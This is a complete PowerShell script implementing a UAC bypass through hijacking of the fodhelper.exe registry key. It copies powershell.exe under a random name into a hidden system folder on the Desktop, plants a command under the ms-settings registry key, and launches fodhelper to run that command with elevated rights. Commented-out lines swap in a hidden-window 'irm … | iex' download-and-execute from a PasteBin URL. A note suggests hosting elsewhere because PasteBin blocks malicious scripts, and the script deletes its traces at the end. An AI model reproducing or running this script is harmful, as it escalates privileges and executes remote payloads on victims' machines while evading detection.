

# Get the Desktop path
try {
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
} catch {
    Write-Error "Failed to retrieve the Desktop path. Exiting script."
    exit
}

# Define the hidden folder path
$hiddenFolderPath = Join-Path -Path $desktopPath -ChildPath ".hiddenFolder"

# Ensure the hidden folder exists
try {
    if (-not (Test-Path $hiddenFolderPath)) {
        New-Item -Path $hiddenFolderPath -ItemType Directory -Force | Out-Null
        Write-Host "Hidden folder created at: $hiddenFolderPath"
    } else {
        Write-Host "Hidden folder already exists at: $hiddenFolderPath"
    }

    # Set folder attributes to hidden and system
    attrib +s +h $hiddenFolderPath
} catch {
    Write-Error "Failed to create or update attributes for the hidden folder. Exiting script."
    exit
}

# PasteBin Link
$PasteBin = "Your PasteBin" #PasteBin blocks malicious scripts, so you might have to use some other methods to host the powershell script


# Generate a unique name for a copied PowerShell executable
$uniqueExeNamePowershell = [guid]::NewGuid().ToString()
$fullUniqueExePowershell = $uniqueExeNamePowershell + ".exe"
$destinationPathPowershell = Join-Path -Path $hiddenFolderPath -ChildPath $fullUniqueExePowershell

try {
    # Copy PowerShell.exe to the hidden folder with a unique name
    $sourcePowershellPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    if (Test-Path $sourcePowershellPath) {
        Copy-Item -Path $sourcePowershellPath -Destination $destinationPathPowershell -Force
        Write-Host "PowerShell executable copied to: $destinationPathPowershell"
    } else {
        Write-Error "Source PowerShell executable not found at $sourcePowershellPath. Exiting script."
        exit
    }
} catch {
    Write-Error "Failed to copy PowerShell executable. Exiting script."
    exit
}

# Create a registry key for a custom command
$regKeyPath = "HKCU:\Software\Classes\ms-settings\Shell\open\command"

try {
    # Create the registry key and set required properties
    New-Item -Path $regKeyPath -Force | Out-Null
    New-ItemProperty -Path $regKeyPath -Name "DelegateExecute" -Value "" -Force | Out-Null

    # Defining the command to be placed in the registry
    #Uncomment/Comment Accordingly
    $command = "$destinationPathPowershell -Command `"echo 'PWNED'; Read-Host;`"" #used for testing if bypass works
    #$command = "$destinationPathPowershell -WindowStyle Hidden -Command `"irm '$($PasteBin)' | iex`"" #with -WindowStyle Hidden
    #$command = "$destinationPathPowershell -Command `"irm '$($PasteBin)' | iex`"" #without -WindowStyle Hidden


    Set-ItemProperty -Path $regKeyPath -Name "(default)" -Value $command -Force
    Write-Host "Registry key created and command set."
} catch {
    Write-Error "Failed to configure the registry key. Exiting script."
    exit
}

# Trigger
try {
    $fodhelperPath = "C:\Windows\System32\fodhelper.exe"
    if (Test-Path $fodhelperPath) {
        Start-Process -FilePath $fodhelperPath -WindowStyle Hidden
        Write-Host "Fodhelper.exe executed."
    } else {
        Write-Error "Fodhelper.exe not found. Exiting script."
        exit
    }
} catch {
    Write-Error "Failed to execute fodhelper.exe. Exiting script."
    exit
}

# Dynamic Wait
try {
    #check if PowerShell executable is still running
    $isPowershellRunning = $true
    Write-Host "Executing UAC-Bypassed Powershell w/ FodHelper-Registry-set-command: $($command)"
    while ($isPowershellRunning) {
        $process = Get-Process -Name $uniqueExeNamePowershell -ErrorAction SilentlyContinue
        if ($process -eq $null) {
            $isPowershellRunning = $false
            Write-Host "PowerShell process completed."
        }
        Start-Sleep -Seconds 3
    }
} catch {
    Write-Error "Error during dynamic wait. Exiting script."
    exit
}

# Clean up the registry key after execution
try {
    if (Test-Path $regKeyPath) {
        Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
        Write-Host "Registry key cleaned up."
    }
} catch {
    Write-Warning "Failed to clean up the registry key. Please remove it manually if necessary."
}

# Clean up rest
try {
    # Remove hidden folder attributes and delete it
    attrib -s -h $hiddenFolderPath
    if (Test-Path $hiddenFolderPath) {
        Remove-Item -Path $hiddenFolderPath -Recurse -Force
        Write-Host "Hidden folder and its contents have been cleaned up."
    } else {
        Write-Host "Hidden folder does not exist or has already been deleted."
    }
} catch {
    Write-Warning "Failed to clean up the hidden folder. Please remove it manually if necessary."
}

# Script completed successfully
Write-Host "Script completed. All operations executed."
exit
